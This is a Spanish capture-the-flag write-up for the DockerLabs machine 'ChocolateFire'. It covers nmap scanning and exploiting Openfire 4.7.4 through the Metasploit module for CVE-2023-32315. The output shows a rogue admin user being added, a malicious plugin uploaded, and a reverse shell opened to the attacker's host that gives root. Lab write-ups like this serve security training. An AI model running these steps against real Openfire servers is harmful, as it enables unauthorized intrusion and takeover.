# 🖥️ Writeup - ChocolateFire 

**Plataforma:** Dockerlabs   
**Sistema Operativo:** Linux  

# INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash 
unzip chocolatefire.zip
```
La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh chocolatefire.tar
``` 
Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
``` 

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

# ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
``` 

```bash
nmap -n -Pn -sC -sV -p5262,5269,7070,9090,5275 --min-rate 5000 172.17.0.2
```

Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 19:18 CEST
Nmap scan report for 172.17.0.2
Host is up (0.0000080s latency).
Not shown: 65523 closed tcp ports (reset)
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
5222/tcp open  jabber
5223/tcp open  ssl/hpvirtgrp?
5262/tcp open  jabber         Ignite Realtime Openfire Jabber server 3.10.0 or later
5263/tcp open  ssl/unknown
5269/tcp open  xmpp           Wildfire XMPP Client
5270/tcp open  xmp?
5275/tcp open  jabber         Ignite Realtime Openfire Jabber server 3.10.0 or later
5276/tcp open  ssl/unknown
7070/tcp open  http           Jetty
7777/tcp open  socks5         (No authentication; connection failed)
9090/tcp open  http           Jetty

MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 165.53 seconds
```

El único puerto que expone un servicio web abierto es el `9090`.

Al acceder desde el navegador, encontramos un panel de `login` de `Openfire`, que además indica que la versión instalada es la `4.7.4`.

A continuación, abrimos `Metasploit` para comprobar si existe algún exploit compatible con esta versión.

# EXPLOTACIÓN

```bash
msfconsole -q
```

Tras realizar la búsqueda, seleccionamos el segundo exploit disponible.

```bash 
search openfire
```

Info:
```
Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/openfire_auth_bypass                     2008-11-10       excellent  Yes    Openfire Admin Console Authentication Bypass
   1    \_ target: Java Universal                                 .                .          .      .
   2    \_ target: Windows x86 (Native Payload)                   .                .          .      .
   3    \_ target: Linux x86 (Native Payload)                     .                .          .      .
   4  exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315  2023-05-26       excellent  Yes    Openfire authentication bypass with RCE plugin


Interact with a module by name or index. For example info 4, use 4 or use exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315
```


```bash
use 4
show options
set LHOST <NUESTRA IP>
set RHOSTS 172.17.0.2
run
```
Info:
```
[*] Started reverse TCP handler on 10.0.4.12:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Openfire version is 4.7.4
[*] Grabbing the cookies.
[*] JSESSIONID=node0byjr7g6fx8fi14pcejjlp50yi27.node0
[*] csrf=HPKXRCQQlxhVu4I
[*] Adding a new admin user.
[*] Logging in with admin user "aixjxwvim" and password "r0TLSO3xf".
[*] Upload and execute plugin "YUZXWL4DcGP3" with payload "java/shell/reverse_tcp".
[*] Sending stage (2952 bytes) to 172.17.0.2
[!] Plugin "YUZXWL4DcGP3" need manually clean-up via Openfire Admin console.
[!] Admin user "aixjxwvim" need manually clean-up via Openfire Admin console.
[*] Command shell session 1 opened (10.0.4.12:4444 -> 172.17.0.2:40304) at 2025-09-08 19:38:36 +0200

```

Al ejecutarlo, conseguimos abrir una `command shell` en la máquina víctima.

```bash
/bin/bash -i
root@39c37e58b12b:~# whoami
root
```

Ya somos root!